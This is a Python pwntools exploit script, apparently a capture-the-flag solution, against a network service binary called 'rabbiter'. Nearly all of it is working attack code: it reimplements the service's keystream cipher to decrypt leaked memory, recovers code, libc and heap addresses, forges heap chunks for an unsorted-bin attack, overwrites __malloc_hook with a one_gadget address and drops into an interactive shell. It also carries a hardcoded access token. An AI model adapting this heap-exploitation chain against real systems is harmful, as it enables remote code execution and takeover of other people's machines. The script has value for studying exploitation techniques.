#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('rabbiter'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

r = remote(HOST, PORT)
if len(sys.argv) > 2: r.sendlineafter('Token:', 'izLYkkq655yLanSM3nFDaeb6EzmWXvL5')

r.sendline('')
r.recvline(); r.recvline(); r.recvline() # motd

def add(idx, buf1, buf2, num=0):
    r.sendline('1')
    r.sendline(buf1, 0x80)
    r.sendline(buf2, 0x180)
    r.sendline(str(num))
    r.recvuntil('VEW')
    plain = r.recvuntil('{}\n'.format(idx), drop=True)
    return len(buf1) - 1 + len(buf2) - 1 + 23 + len(str(num)), plain

def edit(idx, buf):
    r.sendline('36854')
    r.sendline(str(idx))
    r.sendline(str(len(buf)))
    r.sendline(buf, len(buf))

def show(idx, l):
    r.sendline('23')
    r.sendline(str(idx))
    leak = r.recv(l)
    r.recvuntil('OVE\n')
    return leak

def delete(idx):
    r.sendline('44')
    r.sendline(str(idx))

seed = [0] * 17
rotate = lambda v, b: ( (v >> (32 - b)) | (v << b) )

def q(x):
    var8 = x & 0xffff
    varC = x >> 16
    var10 = ((var8 * varC) + (var8 * var8 >> 17) >> 15) + (varC * varC)
    return (var10 ^ x * x) & 0xffffffff

def regen_seed():
    tmp = [seed[i + 8] for i in range(8)]

    seed[8] += seed[16] + 0x4D34D34D;
    seed[8] &= 0xffffffff
    seed[9] += (seed[8] < tmp[0]) - 0x2CB2CB2D;
    seed[9] &= 0xffffffff
    seed[10] += (seed[9] < tmp[1]) + 0x34D34D34;
    seed[10] &= 0xffffffff
    seed[11] += (seed[10] < tmp[2]) + 0x4D34D34D;
    seed[11] &= 0xffffffff
    seed[12] += (seed[11] < tmp[3]) - 0x2CB2CB2D;
    seed[12] &= 0xffffffff
    seed[13] += (seed[12] < tmp[4]) + 0x34D34D34;
    seed[13] &= 0xffffffff
    seed[14] += (seed[13] < tmp[5]) + 0x4D34D34D;
    seed[14] &= 0xffffffff
    seed[15] += (seed[14] < tmp[6]) - 0x2CB2CB2D;
    seed[15] &= 0xffffffff
    seed[16] = seed[15] < tmp[7];
    seed[16] &= 0xffffffff

    tmp2 = [q((seed[i + 8] + seed[i])&0xffffffff) for i in range(8)]

    v3 = tmp2[0]
    v4 = (rotate(tmp2[7], 16) + v3) & 0xffffffff
    v5 = rotate(tmp2[6], 16)
    seed[0] = v5 + v4

    v6 = tmp2[1]
    v7 = rotate(tmp2[0], 8)
    seed[1] = tmp2[7] + (v7 + v6) & 0xffffffff

    v8 = tmp2[2]
    v9 = (rotate(tmp2[1], 16) + v8) & 0xffffffff
    v10 = rotate(tmp2[0], 16)
    seed[2] = v10 + v9

    v11 = tmp2[3]
    v12 = rotate(tmp2[2], 8)
    seed[3] = tmp2[1] + (v12 + v11) & 0xffffffff

    v13 = tmp2[4]
    v14 = (rotate(tmp2[3], 16) + v13) & 0xffffffff
    v15 = rotate(tmp2[2], 16)
    seed[4] = v15 + v14

    v16 = tmp2[5]
    v17 = rotate(tmp2[4], 8)
    seed[5] = tmp2[3] + (v17 + v16) & 0xffffffff

    v18 = tmp2[6]
    v19 = (rotate(tmp2[5], 16) + v18) & 0xffffffff
    v20 = rotate(tmp2[4], 16)
    seed[6] = v20 + v19

    v21 = tmp2[7]
    v22 = rotate(tmp2[6], 8)
    seed[7] = tmp2[5] + (v22 + v21) & 0xffffffff

    for i in range(16):
        seed[i] &= 0xffffffff

def prepare_seed(name):
    name = name.ljust(16, '\0')
    u0 = u32(name[0:4])
    u1 = u32(name[4:8])
    u2 = u32(name[8:12])
    u3 = u32(name[12:16])
    seed[0] = u0
    seed[2] = u1
    seed[4] = u2
    seed[6] = u3
    seed[1] = (u2 >> 16) | (u3 << 16)
    seed[3] = (u3 >> 16) | (u0 << 16)
    seed[5] = (u0 >> 16) | (u1 << 16)
    seed[7] = (u1 >> 16) | (u2 << 16)
    seed[8] =  rotate(u2, 16)
    seed[10] = rotate(u3, 16)
    seed[12] = rotate(u0, 16)
    seed[14] = rotate(u1, 16)
    seed[9]  = (u1 & 0xffff) | u0 & 0xFFFF0000
    seed[11] = (u2 & 0xffff) | u1 & 0xFFFF0000
    seed[13] = (u3 & 0xffff) | u2 & 0xFFFF0000
    seed[15] = (u0 & 0xffff) | u3 & 0xFFFF0000
    seed[16] = 0

    for i in range(4):
        regen_seed()

    for i in range(8):
        seed[((i + 4) & 7) + 8] ^= seed[i]

def decrypt(cipher, debug=False):
    prepare_seed("")

    if len(cipher) % 16: 
        cipher += '\x00'*(16 - len(cipher) % 16)
    plain = '' 
    for i in range(0, len(cipher), 16):
        regen_seed() # lays is our god
        tmp = ''
        tmp += p32((seed[3] << 16 & 0xffffffff) ^ (seed[5] >> 16) ^ (seed[0]) ^ u32(cipher[i     : i + 4 ]))
        tmp += p32((seed[5] << 16 & 0xffffffff) ^ (seed[7] >> 16) ^ (seed[2]) ^ u32(cipher[i + 4 : i + 8 ]))
        tmp += p32((seed[7] << 16 & 0xffffffff) ^ (seed[1] >> 16) ^ (seed[4]) ^ u32(cipher[i + 8 : i + 12]))
        tmp += p32((seed[1] << 16 & 0xffffffff) ^ (seed[3] >> 16) ^ (seed[6]) ^ u32(cipher[i + 12: i + 16]))
        plain += tmp

        if debug:
            print enhex(tmp)
        if 'gggggggg' in tmp:
            print hex(((seed[5] << 16 & 0xffffffff) ^ (seed[7] >> 16) ^ (seed[2])) << 32 | (seed[3] << 16 & 0xffffffff) ^ (seed[5] >> 16) ^ (seed[0])),
            print hex(((seed[1] << 16 & 0xffffffff) ^ (seed[3] >> 16) ^ (seed[6])) << 32 | (seed[7] << 16 & 0xffffffff) ^ (seed[1] >> 16) ^ (seed[4]))
    return plain

# leak base
l, msg = add(0, 'a'*0x80, 'a'*0x180, '1234567890')
log.info('msg: {}'.format(msg))
leak = decrypt(show(0, l))[0x200:]
code_base = u64(leak[24:31]+'\x00') - 0x37b5
log.info('code_base: {}'.format(hex(code_base)))
edit(0, flat('a'*0x200, 0, 0x20df1, 0))
add(1, '', '', '3')
add(2, '', '', '3')
add(3, '', '', '3')
add(4, '', '', '3')
add(5, '', '', '3')
delete(1)
delete(4)
leak = decrypt(show(0, l))[0x200:]
libc_base = u64(leak[16:24]) - 0x3c3b78 
libc.address += libc_base
log.info('libc_base: {}'.format(hex(libc_base)))
heap_base = u64(leak[24:32]) & 0xffffffffffff - 0x840 
log.info('heap_base: {}'.format(hex(heap_base)))

# forge unsorted bin on output buf
g_buf = {}
g_buf[4] = heap_base + 0x420
unsortbin = libc_base + 0x3c3b78 

exp = flat(
    'a'*0x1d8, 0x7e8349c2d77f1c14, 0x5aa5540f07dbfe85 ^ 0x211,      # prev_size & size
    0x19a3c24258722adf ^ g_buf[4], 0xa149828b71699aef ^ unsortbin   # fd & bk
).ljust(0x200, 'a')
edit(0, exp)
a = show(0, len(exp))

# unsortbin attack, ovewrite g_buf[0] to __malloc_hook
output_buf = code_base + 0x205a40
unsortbin = libc_base + 0x3c4c58 
delete(5)
add(1, 'a'*0x80, 'a'*0x180, '1234567890')
edit(1, flat('a'*0x200, 0x210, 0x211))
edit(2, flat(unsortbin, unsortbin))
delete(1)
exp = flat('b'*0x200, 0, 0x211, unsortbin, output_buf + 0x1d8)[:-1]
edit(0, exp)
add(1, '', '', '3')
add(4, 'a'*0x80, 'a'*0x180, '1234567890')

# overwrite __malloc_hook -> one_gadget and shell out !
fuck = libc_base + 0x4526a 
edit(4, 'z'*0x218 + p64(libc.sym['__malloc_hook'])[:-1])
edit(0, p64(fuck))
r.sendline('1')

r.interactive()
